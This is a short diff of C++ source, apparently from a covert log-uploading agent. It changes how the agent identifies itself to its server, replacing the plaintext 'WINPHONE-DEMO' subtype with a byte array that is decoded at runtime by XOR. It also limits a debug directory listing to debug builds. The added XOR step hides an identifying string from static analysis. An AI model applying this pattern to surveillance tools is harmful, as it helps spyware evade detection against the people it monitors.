@@ -1376,15 +1376,18 @@ BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
 		int k, i;
 
 		//"WINPHONE\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		
 		// WINMO-DEMO\x00\x00\x00\x00\x00\x00 ^ Q (Q e' progressivo)
-		/*****
-		BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x19, 0x1a, 0x7b, 0x13, 0x1d, 0x14, 0x15, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60 };
+		//BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x19, 0x1a, 0x7b, 0x13, 0x1d, 0x14, 0x15, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60 };
+
+		//"WINPHONE-DEMO\x00\x00\x00";
+		BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x04, 0x1d, 0x19, 0x19, 0x1d, 0x74, 0x1e, 0x1e, 0x11, 0x12, 0x5e, 0x5f, 0x60 };
 
 		for (i = 0, k = 'Q'; i < 16; i++, k++) {
 			subtype[i] ^= k;
 		}
-		*****/
-		BYTE subtype[] ="WINPHONE-DEMO\x00\x00\x00";
+		
+		
 
 		b.append(subtype, 16);
 	} else {
@@ -2025,9 +2028,10 @@ BOOL Transfer::RestSendLogs() {
 	HANDLE hFile;
 	DWORD dwSize, dwRead = 0;
 
+#ifdef _DEBUG
 	//ByGio usato per debug
 	DebugListLocalDir();
-
+#endif
 
 	// pSnap puo' essere nullo in caso di errore o se non c'e' uberlogObj.
 	// Lo snapshot viene liberato subito dopo questa chiamata.
